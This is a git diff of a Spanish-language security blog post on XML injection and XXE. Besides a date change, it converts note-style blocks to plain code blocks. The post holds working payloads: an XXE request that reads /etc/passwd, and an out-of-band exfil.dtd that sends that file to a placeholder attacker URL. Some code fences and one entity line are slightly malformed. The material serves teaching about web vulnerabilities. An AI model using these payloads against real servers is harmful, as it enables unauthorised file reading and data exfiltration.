@@ -1,7 +1,7 @@
 ---
 title: "XML Injection"
 layout: post
-date: 2022-05-16 15:00
+date: 2022-05-17 15:00
 image: /assets/images/SQL_Injection.png
 headerImage: true
 tag:
@@ -14,27 +14,28 @@ description: Técnica de XML Injection
 
 # XML Injection
 
-```ad-info
-title:Consulta normal
-
+Consulta normal
+```
 /example.php?xml=<test>hacker</test>
 ```
-```ad-warning
-title:Consulta vulnerada
 
+Consulta vulnerada
+```
 /example.php?xml=<!DOCTYPE foo [<!ENTITY xmli "testing">]><test>&xmli;</test>
 ```
 
 **IMPORTANTE encodear los carácteres de la consulta**
 
 # XML eXternal Entities - XXE
-```ad-info
-title:Es posible indicarle al parser XML un archivo externo para poder leerlo.
+
+Es posible indicarle al parser XML un archivo externo para poder leerlo.
+```
 ~~~xml
 <!ENTITY name SYSTEM "URI">
 ```
-```ad-example
-title:Ejemplo
+
+Ejemplo
+```
 ~~~xml
 <!DOCTYPE message [
 	...
@@ -44,8 +45,9 @@ title:Ejemplo
 	<body>&xxefile;</body>
 </message>
 ```
+
+Petición
 ```ad-success
-title:Petición
 ~~~xml
 ../example.php?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
 ```
@@ -56,8 +58,8 @@ En este caso es algo más complejo ya que el sistema tiene que tener acceso o vi
 
 La base de está vulnerabilidad está en la posibilidad de realizar peticiones por DTDs externos. Una manera simple de realizar una petición sería la siguiente:
 
-```ad-seealso
-title:exfill.dtd
+exfill.dtd
+```
 ~~~xml
 <!ENTITY % file SYSTEM []"file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://[url atacante]/?x=%file;'>">
@@ -68,7 +70,6 @@ title:exfill.dtd
 Petición
 
 ```ad-success
-title:Petición
 ~~~xml
 ../example1.php?xml=<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://[URL atacante]/exfil.dtd"> %xxe;]><test>hola</test>
 ```
